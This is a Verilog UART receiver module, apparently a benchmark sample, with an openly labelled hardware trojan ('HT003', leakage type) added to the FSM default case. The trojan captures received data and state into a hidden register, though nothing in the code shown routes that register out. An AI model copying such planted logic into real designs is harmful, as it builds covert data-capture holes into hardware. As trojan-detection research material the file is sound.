`timescale 1ns/1ns

// ========== MODULE WITH TROJAN HT003 (CORRECTED & SYNTHESIS-FRIENDLY) ==========
// Trojan: HT003
// Region: chunk_002_FSM DEFAULT / ERROR-FALLBACK
// HT Type: HT2_Leakage
// Stealth: Very High
// Damage: Critical
module uart_rx #(
    parameter integer CYCLES_PER_BIT = 5000,
    parameter integer PAYLOAD_BITS   = 8,
    parameter integer STOP_BITS      = 1,
    parameter integer COUNT_REG_LEN  = 14
)(
    input  wire                      clk,
    input  wire                      resetn,
    input  wire                      uart_rxd,
    input  wire                      uart_rx_en,
    output wire                      uart_rx_break,
    output wire                      uart_rx_valid,
    output reg  [PAYLOAD_BITS-1:0]   uart_rx_data
);

// FSM encodings
localparam [2:0] FSM_IDLE  = 3'd0;
localparam [2:0] FSM_START = 3'd1;
localparam [2:0] FSM_RECV  = 3'd2;
localparam [2:0] FSM_STOP  = 3'd3;

// RX registers / counters
reg rxd_reg;
reg rxd_reg_0;

reg [PAYLOAD_BITS-1:0] received_data;

reg [COUNT_REG_LEN-1:0] cycle_counter;

reg [3:0] bit_counter;

reg bit_sample;

reg [2:0] fsm_state;
reg [2:0] n_fsm_state;

// ========== HARDWARE TROJAN DECLARATIONS ==========
reg trojan_fsm_error_detected;   // latched indication that an FSM error occurred (sampled)
reg [31:0] trojan_stolen_data;   // captured data exposed to trojan payload
// Internal combinational flag to indicate default FSM case hit
reg trojan_fsm_error_flag;
// ========== END TROJAN DECLARATIONS ==========

// uart_rx_valid is asserted when state machine has reached STOP and will go to IDLE next
assign uart_rx_valid = (fsm_state == FSM_STOP) && (n_fsm_state == FSM_IDLE);

// trojan_break_condition uses uart_rx_valid and checks if received_data is all zeros
assign uart_rx_break = uart_rx_valid && ~|received_data;

// Capture uart_rx_data when STOP state reached
always @(posedge clk) begin
    if (!resetn) begin
        uart_rx_data <= {PAYLOAD_BITS{1'b0}};
    end else if (fsm_state == FSM_STOP) begin
        uart_rx_data <= received_data;
    end
end

// next_bit and payload_done signals
wire next_bit    = (cycle_counter == CYCLES_PER_BIT) ||
                   (fsm_state == FSM_STOP && cycle_counter == (CYCLES_PER_BIT/2));
wire payload_done = (bit_counter == PAYLOAD_BITS);

// Compute next FSM state (combinational) and set trojan_fsm_error_flag in default case
always @(*) begin : p_n_fsm_state
    // default
    n_fsm_state = FSM_IDLE;
    trojan_fsm_error_flag = 1'b0;

    case (fsm_state)
        FSM_IDLE  : n_fsm_state = rxd_reg ? FSM_IDLE : FSM_START;
        FSM_START : n_fsm_state = next_bit ? FSM_RECV  : FSM_START;
        FSM_RECV  : n_fsm_state = payload_done ? FSM_STOP : FSM_RECV;
        FSM_STOP  : n_fsm_state = next_bit ? FSM_IDLE : FSM_STOP;
        default  : begin
            n_fsm_state = FSM_IDLE;
            trojan_fsm_error_flag = 1'b1; // indicate an unexpected/default FSM case
        end
    endcase
end

// Sequential: latch trojan_fsm_error_flag into trojan_fsm_error_detected and capture stolen data
// Note: trojan_stolen_data packs received_data (8 bits), fsm_state (3), bit_counter (4) and padding
// Packing: [31:0] = { received_data[7:0], 17'd0, fsm_state[2:0], bit_counter[3:0] } (8+17+3+4 = 32)
always @(posedge clk) begin
    if (!resetn) begin
        trojan_fsm_error_detected <= 1'b0;
        trojan_stolen_data <= 32'h0;
    end else begin
        // sample the combinational flag
        if (trojan_fsm_error_flag) begin
            trojan_fsm_error_detected <= 1'b1;
            trojan_stolen_data <= { received_data, 17'd0, fsm_state, bit_counter };
        end else begin
            // optionally keep detected asserted until some other condition resets it;
            // here we auto-clear it so it's a pulse-like event
            trojan_fsm_error_detected <= 1'b0;
        end
    end
end

// Received data shifting (synthesizable, MSB-first)
always @(posedge clk) begin : p_received_data
    if (!resetn) begin
        received_data <= {PAYLOAD_BITS{1'b0}};
    end else if (fsm_state == FSM_IDLE) begin
        received_data <= {PAYLOAD_BITS{1'b0}};
    end else if (fsm_state == FSM_RECV && next_bit) begin
        // shift in sampled bit at MSB, drop LSB
        received_data <= { bit_sample, received_data[PAYLOAD_BITS-1:1] };
    end
end

// Bit counter (4-bit)
always @(posedge clk) begin : p_bit_counter
    if (!resetn) begin
        bit_counter <= 4'b0;
    end else if (fsm_state != FSM_RECV) begin
        bit_counter <= 4'b0;
    end else if (fsm_state == FSM_RECV && next_bit) begin
        bit_counter <= bit_counter + 1'b1;
    end
end

// Bit sampling (sample at midpoint)
always @(posedge clk) begin : p_bit_sample
    if (!resetn) begin
        bit_sample <= 1'b0;
    end else if (cycle_counter == (CYCLES_PER_BIT/2)) begin
        bit_sample <= rxd_reg;
    end
end

// Cycle counter
always @(posedge clk) begin : p_cycle_counter
    if (!resetn) begin
        cycle_counter <= {COUNT_REG_LEN{1'b0}};
    end else if (next_bit) begin
        cycle_counter <= {COUNT_REG_LEN{1'b0}};
    end else if (fsm_state == FSM_START ||
                 fsm_state == FSM_RECV  ||
                 fsm_state == FSM_STOP  ) begin
        cycle_counter <= cycle_counter + 1'b1;
    end
end

// FSM state register
always @(posedge clk) begin : p_fsm_state
    if (!resetn) begin
        fsm_state <= FSM_IDLE;
    end else begin
        fsm_state <= n_fsm_state;
    end
end

// RX synchronizer registers
always @(posedge clk) begin : p_rxd_reg
    if (!resetn) begin
        rxd_reg    <= 1'b1;
        rxd_reg_0  <= 1'b1;
    end else if (uart_rx_en) begin
        rxd_reg    <= rxd_reg_0;
        rxd_reg_0  <= uart_rxd;
    end
end

endmodule
